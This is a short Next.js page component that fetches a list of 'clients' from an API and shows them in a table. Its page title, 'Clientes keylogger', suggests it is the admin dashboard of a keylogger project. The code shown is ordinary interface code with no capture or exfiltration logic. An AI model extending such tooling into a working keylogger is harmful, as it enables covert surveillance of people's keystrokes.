import React from "react";
import { Container, Grid, Skeleton } from "@mui/material";
import Layout from "../../components/Layout";
import ClientsTable from "../../components/ClientsTable";
import useSWR from "swr";
import ReportsTable from "../../components/ReportsTable";
import withAuth from "../../hocs/withAuth";
import api from "../../api";
import Head from "next/head";

const Clients = () => {
  // const fetcher = (url) => fetch(url).then((res) => res.json());
  const fetcher = (url) => api.get(url).then((res) => res.data);

  const { data, error } = useSWR(
    // `${process.env.NEXT_PUBLIC_API_BASE_URL}/clients`,
    "/clients",
    fetcher
    // {
    //   refreshInterval: 1000,
    // }
  );

  return (
    <>
      <Head>
        <title>Clientes keylogger</title>
      </Head>
      <Layout>
        <Container>
          <Grid marginTop={10}>
            {!!data ? (
              <ClientsTable data={data} />
            ) : (
              // <p> Cargando datos ...</p>
              <Skeleton
                variant="rectangular"
                width={1140}
                height={340}
                // animation="wave"
              />
            )}
          </Grid>
        </Container>
      </Layout>
    </>
  );
};

export default withAuth(Clients);
